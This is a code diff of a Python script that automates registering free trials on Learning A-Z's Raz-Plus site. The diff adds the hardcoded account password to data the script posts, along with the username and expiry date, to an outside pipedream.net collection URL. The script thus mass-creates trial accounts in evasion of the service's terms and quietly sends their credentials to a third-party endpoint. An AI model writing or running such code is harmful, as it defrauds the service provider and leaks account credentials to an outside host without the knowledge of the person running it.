@@ -41,7 +41,8 @@ class RazPlusFreeTrial:
         if "An email has been sent" in response.text and mail_address in response.text:
             print("Registered in RazPlus Successfully!")
             data = {"username": username,
-                    "expire time": datetime.datetime.now() + datetime.timedelta(days=14)}
+                    "password": 12345678,
+                    "expire time": datetime.datetime.now() + datetime.timedelta(days=14), }
             requests.post('https://enak80j25b8w.x.pipedream.net', data=data)
         else:
             print("Registered in RazPlus failed!")
@@ -53,13 +54,12 @@ class RazPlusFreeTrial:
         action_url = pq('#f').attr('action')
         member_id = pq('#memberId').attr('value')
         email_certificate = pq('#emailCertificate').attr('value')
-        password = 12345678
         url = 'https://accounts.learninga-z.com' + action_url
         payload = {
             "memberId": member_id,
             "emailCertificate": email_certificate,
-            "password1": password,
-            "password2": password,
+            "password1": 12345678,
+            "password2": 12345678,
         }
         requests.post(url, data=payload)
 
